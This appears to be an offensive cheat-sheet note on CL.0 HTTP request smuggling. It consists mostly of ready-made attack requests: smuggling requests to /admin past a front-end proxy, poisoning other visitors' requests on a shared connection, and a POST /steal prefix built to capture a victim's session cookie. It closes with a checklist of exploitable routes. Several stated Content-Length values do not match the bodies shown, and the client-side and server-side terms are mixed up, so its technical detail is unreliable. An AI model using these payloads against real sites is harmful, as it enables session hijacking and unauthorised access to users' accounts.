# Client-side desync — CL.0 and the victim's request

## The shape — the server ignores the body entirely

```text
POST / HTTP/1.1
Host: t
Content-Length: 45

GET /admin HTTP/1.1
Host: t
```

Front honors `Content-Length: 45` → waits/forwards 45 bytes. Back
IGNORES the body on this method/route (e.g., a GET handler that doesn't
read POST bodies, or a route that responds before consuming) → reads
`GET /admin` as the NEXT request → the smuggled GET runs as the VICTIM's
next request.

## Why "client-side" — the smuggle poisons the victim, not you

On a shared connection the smuggled prefix lands in front of the NEXT
request — usually another visitor's — the victim's request inherits the
prefix → the victim's response carries the smuggle's effect.

## The CL.0 primitives — `POST` body ignored

```text
POST /redirect HTTP/1.1
Host: t
Content-Length: 55

GET /admin HTTP/1.1
Host: t
Foo: x
```

A route that responds `302` or a static handler that ignores the body →
`GET /admin` is the next request → runs as whoever's next on the socket.

## The tunneling route — the upgrade-path

After an `Upgrade: websocket` the front proxies raw frames — the smuggle
inside a frame → `upgrade-smuggling.md`.

## The self-desync — your own next request

```text
POST / HTTP/1.1
Content-Length: 45

GET /?self=poison HTTP/1.1
Host: t
```

Then `GET /` — the second request's response carries `/self=poison`'s
output — self-desync — `response-poisoning.md`.

## The victim-poison — the shared-connection attack

```text
POST / HTTP/1.1
Content-Length: 80

POST /steal HTTP/1.1
Host: t
Cookie: 
```

The smuggled POST's `Cookie:` header is empty — the NEXT victim's request
provides its OWN Cookie → the victim's cookie lands INSIDE the smuggle's
Cookie header → `session-hijack.md` — cookie-stealing via queue poison.

## The HEAD/GET-bodyless — the method check

Routes that respond without reading the body — `HEAD`, some `GET`,
some `OPTIONS` — are the CL.0 candidates. Probe each method — the one
that ignores the body is the smuggle route.

## The redirect-ignore — `Location:` responders

A `POST` that always `302`s without reading the body → the body is the
next request → desync on every request.

## The common routes that ignore bodies — the checklist

- `GET`/`HEAD`/`OPTIONS` handlers — most ignore the body
- redirect endpoints — `302`/`301` responses
- error handlers — `404`/`500` responses
- static-file handlers — file responses
- auth-check-first routes — rejects before reading

## The detection — the smuggle-executes-as-next

```text
POST /ignored-body HTTP/1.1
Content-Length: 60

GET /detect-marker HTTP/1.1
Host: t
```

Then ANY request on the connection → the next response is the
`/detect-marker` response → the smuggle ran as the next request.

## The readback — the self-serve

```text
POST /search HTTP/1.1
Content-Length: 65

GET /search?q=SMUGGLED HTTP/1.1
Host: t
```

The smuggled `GET /search?q=SMUGGLED` lands as the next request — its
response carries `SMUGGLED` — the readback — `detection.md`.

## The evidence bar — what confirms

- the smuggle's output lands on the NEXT request's response
- a victim's request inherits the smuggled prefix — the victim's
  response is poisoned
- the `Cookie:` smuggle returns a victim's cookie — a hijack
